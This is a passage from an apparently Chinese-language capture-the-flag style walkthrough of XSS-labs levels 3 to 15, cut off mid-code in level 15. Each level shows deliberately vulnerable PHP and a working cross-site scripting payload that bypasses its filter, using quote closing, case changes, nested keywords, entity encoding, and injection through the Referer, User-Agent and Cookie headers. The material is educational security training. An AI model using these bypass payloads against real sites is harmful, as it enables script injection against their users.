闭合单引号</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action=level3.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&apos;&quot;.htmlspecialchars($str).&quot;&apos;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>keyword变量通过<strong>GET</strong>方式传入，赋值给<code>$str</code>变量，然后带入到<code>&lt;h2&gt;</code>标签中和<code>&lt;input&gt;</code>标签。 <code>&lt;h2&gt;</code>标签经过了<code>htmlspecialchars($str)</code>编码，<code>&lt;input&gt;</code>标签没有任何过滤，所以尝试在<code>&lt;input&gt;</code>标签中闭合单引号<code>&#39;</code>，来触发事件。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第4关-闭合双引号"><a href="#第4关-闭合双引号" class="headerlink" title="第4关 闭合双引号"></a>第4关 闭合双引号</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level4.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在第2关的基础上，过滤了尖括号，但是直接在<code>&lt;input&gt;</code>标签中构造闭合双引号来构造事件来触发并用不到引号，所以第2关的payload依然适用。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第5关-javascript妙用"><a href="#第5关-javascript妙用" class="headerlink" title="第5关 javascript妙用"></a>第5关 javascript妙用</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level5.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先对keyword变量使用了<code>strtolower()</code>函数转换，把所有字符转换为小写；接着过滤了<code>&lt;script</code>，并替换为<code>&lt;scr_ipt</code>；过滤了<code>on</code>并替换为<code>o_n</code>。因为<code>on</code>是很多事件都包含的关键词，所以这里无法直接通过闭合引号在<code>&lt;input&gt;</code>标签中来触发弹窗了，这个可以闭合双引号和标签，然后通过<code>javascript:alert(&#39;XSS&#39;)</code>这种形式来触发弹窗。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第6关-大小写转换"><a href="#第6关-大小写转换" class="headerlink" title="第6关 大小写转换"></a>第6关 大小写转换</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level6.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>比第5关加入了很多的过滤规则，而且过滤了<code>href</code>属性，这样就无法使用<code>javascript:alert()</code>这种形势来弹窗了，但是仔细观察源码，这里少了第5关的<code>strtolower()</code>函数，所以这里可以通过大小写转换来绕过过滤。</p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; Onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a Href=javascript:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第7关-嵌套构造"><a href="#第7关-嵌套构造" class="headerlink" title="第7关 嵌套构造"></a>第7关 嵌套构造</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str =strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level7.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在第6关的基础上，首先还统一使用了<code>strtolower()</code>函数，将keyword变量的值转换了小写，这样就无法直接使用大小写转换的思路来绕过了。但是这里的过滤比较巧妙，是直接将敏感字符替换为空（即删掉了），这种机制我们可以尝试使用嵌套构造payload来绕过。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; oonnclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第8关-HTML编码"><a href="#第8关-HTML编码" class="headerlink" title="第8关 HTML编码"></a>第8关 HTML编码</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level8.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的过滤规则很完善，基本上都过滤掉了可能触发弹窗的一些字符串。同时有2个输出，一个输出在了<code>&lt;input&gt;</code>标签中，并且通过<code>htmlspecialchars($str)</code>函数实体化后输出来，这里基本上是凉凉了。看第2个输出，是在<code>&lt;a&gt;</code>标签中，而且没有过滤，直接输出在了双引号<code>&quot;</code>之间，当作字符串处理，利用当作字符串处理的特点，可以直接将我们的payload HTML使用HTML实体字符编码绕过，有因为直接输出在了<code>href</code>的属性里面，所以可以尝试<code>javascript()</code>这种形式来触发弹窗。</p><p>j将<code>t</code>编码为<code>t</code></p><p><strong>payload1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><p>也可以将<code>Tab键</code>编码为<code>插入到关键词中绕过过滤；同理也可以将`回车键`编码为</code>插入来Bypass</p><p><strong>payload2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x09;t:alert(&apos;XSS&apos;) //</span><br><span class="line">javascrip&amp;#x0a;t:alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第9关-阅读源码"><a href="#第9关-阅读源码" class="headerlink" title="第9关 阅读源码"></a>第9关 阅读源码</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);</span><br><span class="line">echo &apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里只是比第8关多了到对提交的keyword里面是否有<code>http://</code>的检测，所以Bypass的话就很简单，直接在第8关的payload后面添加：<code>http://</code></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#x74;:alert(&apos;XSS&apos;) //http://</span><br></pre></td></tr></table></figure><h2 id="第10关-覆盖元素属性"><a href="#第10关-覆盖元素属性" class="headerlink" title="第10关 覆盖元素属性"></a>第10关 覆盖元素属性</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看出这里keyword变量依然没戏，被HTML实体化输出了出来，所以重点放在<code>t_sort</code>变量上，只过滤了尖括号，然后就直接输出到了<code>&lt;input&gt;</code>标签中，所以这里可以尝试直接在标签中闭合构造事件来弹窗，还得注意一点就是这里的<code>&lt;input&gt;</code>标签使用了<code>type=&quot;hidden&quot;</code>将输入框隐藏了起来，可以手动赋值<code>type</code>的值来覆盖掉先前的属性来达到显示文本框的目的。</p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level10.php?keyword=233&amp;t_sort=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第11关-HTTP-Referer"><a href="#第11关-HTTP-Referer" class="headerlink" title="第11关 HTTP Referer"></a>第11关 HTTP Referer</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_REFERER&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看变量的输出基本上可以判定<code>$str</code>和<code>$str00</code>变量没戏，也就是我们可以控制的<code>keyword</code>和<code>t_sort</code>变量是无法突破限制来弹窗的。观察<code>$str33</code>是通过<code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code>过滤了尖括号然后赋值的，那么尝试在HTTP请求头的<code>Referer</code>构造payload。</p><p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>Referer</code>字段：</p><p><img src="http://qiniuyun.lintstar.top/1555499820467.png" alt="1555499820467"></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第12关-HTTP-User-Agent"><a href="#第12关-HTTP-User-Agent" class="headerlink" title="第12关 HTTP User-Agent"></a>第12关 HTTP User-Agent</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这一题和上一题类似，只是这里的漏洞点出现在了HTTP请求头的<code>User-Agent</code>。</p><p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>User-Agent</code>字段：</p><p><img src="http://qiniuyun.lintstar.top/1555500203323.png" alt="1555500203323"></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第13关-HTTP-Cookie"><a href="#第13关-HTTP-Cookie" class="headerlink" title="第13关 HTTP Cookie"></a>第13关 HTTP Cookie</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_COOKIE[&quot;user&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_cook&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里的漏洞点出现在了HTTP请求头的<code>Cookie</code>的<code>user</code>属性中。</p><p>使用<code>hackbar</code>或者<code>BurpSuite</code>可以很方便地改写HTTP请求头地<code>Cookie</code>字段：</p><p><img src="http://qiniuyun.lintstar.top/1555500926177.png" alt="1555500926177"></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=&quot; type=&quot;&quot; onclick=alert(&apos;XSS&apos;) //</span><br></pre></td></tr></table></figure><h2 id="第14关-Angular-JS"><a href="#第14关-Angular-JS" class="headerlink" title="第14关 Angular JS"></a>第14关 Angular JS</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &apos;&lt;body&gt;&lt;span class=&quot;ng-include:&apos;.htmlspecialchars($str).&apos;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这题考察<code>Angular JS</code> 的<code>ng-include</code>用法，具体可以参考这篇资料：<a href="http://www.runoob.com/angularjs/ng-ng-include.html" target="_blank" rel="noopener">AngularJS ng-include 指令</a></p><p><strong>ng-include</strong> 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。所以这里就用来包含其他关的页面来触发弹窗。</p><p><img src="http://qiniuyun.lintstar.top/1555507993008.png" alt="1555507993008"></p><p><strong>payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level14.php?src=&quot;level1.php?name=&lt;img src=x onerror=alert(&apos;XSS&apos;)&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="第15关-过滤空格"><a href="#第15关-过滤空格" class="headerlink" title="第15关 过滤空格"></a>第15关 过滤空格</h2><p><strong>源码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;    